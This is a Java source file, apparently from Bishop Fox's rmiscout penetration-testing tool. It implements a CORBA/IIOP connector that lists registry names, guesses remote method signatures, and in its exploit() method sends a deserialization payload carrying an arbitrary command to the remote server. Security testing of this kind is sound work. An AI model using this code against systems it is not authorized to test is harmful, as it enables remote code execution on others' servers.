package com.bishopfox.rmiscout;

import com.sun.corba.se.impl.corba.CORBAObjectImpl;
import javassist.*;
import org.omg.CORBA.ORB;

import javax.naming.*;
import java.io.Serializable;
import java.rmi.AccessException;
import java.rmi.RemoteException;
import java.util.*;

@SuppressWarnings("deprecation")
public class IIOPConnector implements Connector {
    private List<String> signatures;
    private String[] regNames;
    private boolean allowUnsafe;
    private HashMap<String, IIOPStub> remoteRefs;
    private static final HashMap<String, String> corbaTypeMap = new HashMap<String, String>() {{
        put("int","long");
        put("long","long_long");
        put("java_lang_String","CORBA_WStringValue");
        put("java_lang_Class","javax_rmi_CORBA_ClassDesc");
        put("byte","octet");
        put("char","wchar");
    }};
    private boolean responseExpected = false;

    @SuppressWarnings("deprecation")
    public IIOPConnector(String host, int port, String remoteName, List<String> signatures, boolean allowUnsafe) {
        if (!System.getProperty("java.version").startsWith("1.8")) {
            System.err.println(Utilities.Colors.RED + "[ERROR] Corba-IIOP only works on JRE 8 " + Utilities.Colors.ENDC);
            System.exit(-1);
        }

        this.signatures = signatures;
        this.allowUnsafe = allowUnsafe;
        this.regNames = null;

        Properties props = new Properties();
        String iiopUrl = "iiop://" + host + ":" + port;
        props.put(Context.PROVIDER_URL, iiopUrl);
        props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.cosnaming.CNCtxFactory");

        Context ctx = null;
        try {
            ctx = new InitialContext(props);

            regNames = list(ctx);

            if (remoteName != null) {
                regNames = new String[]{remoteName};
            }

            this.remoteRefs = new HashMap<>();
            for (String regName : regNames) {
                try {
                    CORBAObjectImpl ref = (CORBAObjectImpl) ctx.lookup(regName);
                    IIOPStub stub = new IIOPStub();
                    stub._set_delegate(ref._get_delegate());
                    remoteRefs.put(remoteName, stub);
                } catch (NameNotFoundException e) {
                    System.err.println(Utilities.Colors.RED + "[ERROR] Registry not bound on remote server: '" + regName + "'" + Utilities.Colors.ENDC);
                    System.exit(-1);
                }
            }
        } catch (NamingException e) {
            System.err.println(Utilities.Colors.RED + "[ERROR] Could not connect to remote host: " + iiopUrl + Utilities.Colors.ENDC);
            System.exit(-1);
        } catch (AccessException e) {
            e.printStackTrace();
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    public static String[] list(Context ctx) throws RemoteException, AccessException {
        NamingEnumeration list = null;
        try {
            ArrayList<String> ret = new ArrayList<String>();

            list = ctx.list("");

            while (list.hasMore()) {
                String[] split = list.next().toString().split(":");
                ret.add(split[0]);
            }
            return ret.toArray(new String[ret.size()]);
        } catch (NamingException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public void checkIfPresent() {
        Serializable[] payload = new Serializable[]{
                Utilities.generateDummyClass(ClassPool.getDefault())
        };
        execute(payload, false);
    }

    public boolean execute(Serializable[] payloads, boolean preserveStrings) {
        boolean success = false;
        for (Map.Entry<String, IIOPStub> pair : remoteRefs.entrySet()) {
            CtClass dummyInterface = ClassPool.getDefault().makeInterface("DummyInterface");
            IIOPStub stub = pair.getValue();

            for (String sig : signatures) {
                Utilities.checkAndCreateTypes(sig);

                CtMethod newmethod = null;
                try {
                    newmethod = CtNewMethod.make(String.format("%s throws java.rmi.RemoteException;", sig), dummyInterface);
                    CtClass[] types = newmethod.getParameterTypes();

                    // Skip void args because they will always be executed
                    if (!allowUnsafe && types.length < 2) {
                        if (types.length == 0) {
                            System.out.println("[INFO] Skipping, void args: " + sig);
                            continue;
                        } else if (!types[0].getName().contains(".") && !types[0].getName().contains("[]")) {
                            System.out.println("[INFO] Skipping, single primitive arg: " + sig);
                            continue;
                        }
                    }

                    ArrayList<ParamPair> params = new ArrayList<>();
                    String corbaSig = newmethod.getName();
                    for (int i = 0; i < types.length; i++) {
                        // Generate CORBA signature
                        corbaSig += "__";

                        // Resolve special CORBA type names
                        String type = types[i].getName().replace(".","_");
                        String cleanType = type.replace("[]", "");

                        if (corbaTypeMap.containsKey(cleanType)) {
                            cleanType = corbaTypeMap.get(cleanType);
                        }

                        if (type.contains("[]")){
                            // Create the crazy CORBA array identifier
                            int nDimensions = Utilities.count("[]", type);
                            int split = cleanType.lastIndexOf("_");
                            if (split > 1) {
                                corbaSig += "org_omg_boxedRMI_" + cleanType.substring(0, split) + "_seq" + nDimensions + cleanType.substring(split);
                            } else {
                                corbaSig += "org_omg_boxedRMI_" + cleanType + "_seq" + nDimensions + "_" + cleanType;
                            }

                            // Add payload to params
                            params.add(new ParamPair(new Object[0].getClass(), payloads[i % payloads.length]));
                        }
                        else {
                            corbaSig += cleanType;
                            // Add payload to params
                            params.add(new ParamPair(payloads[i % payloads.length].getClass(), payloads[i % payloads.length]));
                        }


                    }

                    if(!stub.execute(newmethod.getName(), params, sig, responseExpected)) {
                        // Check duplicate method name syntax
                        if(stub.execute(corbaSig, params, sig, responseExpected)) {
                            success = true;
                        }
                    } else {
                        success = true;
                    }
                } catch (CannotCompileException e) {
                    System.err.println("\n" + Utilities.Colors.RED + "[ERROR] Invalid Signature: " + sig + Utilities.Colors.ENDC);
                    e.printStackTrace();
                } catch (NotFoundException e) {
                    e.printStackTrace();
                }

            }
        }
        return success;
    }

    public void exploit(String payloadName, String command) {
        Serializable[] payload = new Serializable[]{
                Utilities.generatePayload(payloadName, command)
        };
        // Check for universally exploitable param (i.e., non-primitives other than java.lang.String)
        //boolean exploitableParam = checkExploitableParam();

        // Try preserving strings during execution if first try fails
        if(!execute(payload, false)) {// && !execute(payload, true)) {
//            if (exploitableParam) {
//                System.err.println(RMIConnector.Colors.RED + "[ERROR] Payload was not invoked. Check the accuracy of the signature." + RMIConnector.Colors.ENDC);
//            } else {
//                System.err.println(RMIConnector.Colors.RED + "[ERROR] Server-side JRE (>=8u242-b07, >=11.0.6+10, >=13.0.2+5, >=14.0.1+2) can't be exploited by java.lang.String types" + RMIConnector.Colors.ENDC);
//            }
        } else {
            System.out.println("Executed");
        }
    }

    public void invoke(String[] params) {
        responseExpected = true;
        Serializable[] payloads = Utilities.UnmarshalParams(signatures.get(0), params);
        execute(payloads, false);
    }

    @Override
    public void cleanup() {
        // pass
    }
}
